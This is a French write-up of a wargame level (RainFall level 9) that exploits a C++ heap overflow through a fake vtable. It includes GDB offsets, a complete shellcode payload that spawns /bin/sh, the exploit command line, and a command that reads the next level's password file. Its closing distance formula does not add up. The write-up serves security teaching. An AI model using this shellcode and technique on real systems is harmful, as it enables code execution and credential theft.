# Level 9 — C++: heap BoF + fake vtable hijack

## Main simplifié

```cpp
class N {
public:
    void (*vtable_ptr)(N*, N*);   // offset 0x00 — pointeur vers la vtable
    char annotation[0x64];         // offset 0x04 — buffer de 100 octets
    int value;                     // offset 0x68

    N(int v) {
        vtable_ptr = &PTR_operator+;   // initialisé par le constructeur
        value      = v;
    }

    void setAnnotation(char *s) {
        strcpy(annotation, s);          // <-- pas de borne -> heap BoF
    }
};

int main(int argc, char **argv) {
    if (argc < 2) _exit(1);

    N *a = new N(5);                    // operator new(0x6c) -> 108 octets
    N *b = new N(6);                    // alloué juste après a sur la heap

    a->setAnnotation(argv[1]);          // <-- la faille : strcpy non bornée

    // En ASM final :
    //   mov  eax, [b]            ; eax = b
    //   mov  eax, [eax]          ; eax = b->vtable_ptr
    //   mov  edx, [eax]          ; edx = *(b->vtable_ptr) = vtable[0]
    //   call edx                 ; appel via double indirection
    (*b->vtable_ptr[0])(b, a);
}
```

## Vulnérabilité

`a->setAnnotation(argv[1])` fait `strcpy(a->annotation, argv[1])` sans limite.
`annotation` fait 100 octets, mais on peut écrire bien plus → on déborde dans le chunk de `b` qui est juste après sur la heap.
En écrasant `b->vtable_ptr` (le tout premier champ de `b`), on contrôle où le CPU ira chercher la fonction à appeler à la fin du `main`.

## L'appel final : double indirection

Le `call` à la fin de `main` n'est pas direct, il suit deux pointeurs :

```
1. Lire b->vtable_ptr        (= valeur écrasée par notre BoF)
2. Lire *(b->vtable_ptr)     (= vtable[0])
3. Sauter à cette adresse
```

On contrôle :
- Le **contenu** de `a->annotation` (= `argv[1]` après le strcpy)
- La **valeur** écrasée dans `b->vtable_ptr` (= les derniers octets du débordement)

→ On peut donc faire pointer `b->vtable_ptr` sur `&a->annotation`, où on a fabriqué une **fausse vtable** qui pointe sur notre shellcode (placé juste après dans le même buffer).

## Distance heap (mesurée en GDB)

```
break *0x0804861c    ; juste après operator new pour a
break *0x0804863e    ; juste après operator new pour b
break *0x0804867c    ; juste après setAnnotation (utile pour voir la heap)

run AAAA

Breakpoint 1 : eax = 0x804a008    → a = 0x804a008
Breakpoint 2 : eax = 0x804a078    → b = 0x804a078
```

```
&a->annotation = a + 4    = 0x804a00c
&b->vtable_ptr = b        = 0x804a078
distance       = 0x6c     = 108 octets
```

→ Il faut **108 octets** dans `argv[1]` avant d'atteindre `b->vtable_ptr`. Les 4 octets qui suivent écrasent ce pointeur.

## Construction du payload

```
┌──────────────┬──────────────┬─────────────┬──────────────┐
│ fake vtable  │ shellcode    │ padding     │ &fake_vtable │
│ (4 octets)   │ (25 octets)  │ (79 'A')    │ (4 octets)   │
└──────────────┴──────────────┴─────────────┴──────────────┘
   = &shellcode                                = &a->annotation
   = 0x0804a010                                = 0x0804a00c

Total : 4 + 25 + 79 + 4 = 112 octets
```

Détail des 4 blocs :

1. **fake vtable** (`\x10\xa0\x04\x08`) : 4 octets qui pointent vers le shellcode (situé juste derrière dans le buffer, donc à `&annotation + 4` = `0x0804a010`). C'est ce que le CPU lira comme `vtable[0]` au pas 2 de la double indirection.

2. **shellcode** (25 octets) : `execve("/bin/sh", NULL, NULL)` classique 32-bit :
   `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80`

3. **padding** : `'A' * 79` pour atteindre exactement `&b->vtable_ptr` (108 − 4 − 25 = 79).

4. **&fake_vtable** (`\x0c\xa0\x04\x08`) : écrase `b->vtable_ptr` avec l'adresse du début de `annotation`, là où se trouve la fake vtable.

## Trace de l'exécution après le strcpy

État de la heap :

```
0x0804a00c   \x10\xa0\x04\x08              ← fake vtable[0] = &shellcode
0x0804a010   \x31\xc0\x50\x68...           ← shellcode
0x0804a029   AAAA...                       ← padding (79 'A')
0x0804a078   \x0c\xa0\x04\x08              ← b->vtable_ptr écrasé = &annotation
```

Déroulé du `call` final :

```
b             = 0x0804a078
*b            = 0x0804a00c     (= &annotation, qu'on a écrit)
*(0x0804a00c) = 0x0804a010     (= fake vtable[0])
call 0x0804a010                → saute dans le shellcode → /bin/sh
```

## Exploit

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A"*79 + "\x0c\xa0\x04\x08"')
```

Pour garder le shell vivant après l'exploit (stdin reste ouvert) :

```bash
(./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A"*79 + "\x0c\xa0\x04\x08"'); cat)
```

Une fois dans le shell (pas de prompt — c'est normal) :

```
whoami
cat /home/user/bonus0/.pass
```

## À retenir

- En C++, les appels virtuels passent par une **vtable** : double indirection (`b → vtable → fonction`). Écraser `b->vtable_ptr` redirige tout l'appel.
- On ne peut pas pointer `b->vtable_ptr` directement sur le shellcode : le CPU déréférence deux fois. Il faut **fabriquer une fausse vtable** entre les deux : 4 octets dans notre buffer qui contiennent l'adresse du shellcode.
- L'ordre `[fake vtable][shellcode][padding][&fake_vtable]` est imposé par la mécanique de la double indirection — les 4 premiers octets de notre buffer SONT la fake vtable.
- Le shellcode 32-bit `execve("/bin/sh")` fait 25 octets et n'a pas d'octets nuls → passe sans souci dans un `strcpy`.
- Les adresses heap sur RainFall sont **stables** (pas d'ASLR effectif) : ce qu'on mesure en GDB est réutilisable directement.
- Distance 108 = `sizeof(N) + sizeof(chunk_header) − offset(annotation)` ; ça correspond à la mesure `b − (a+4)` = `0x6c`.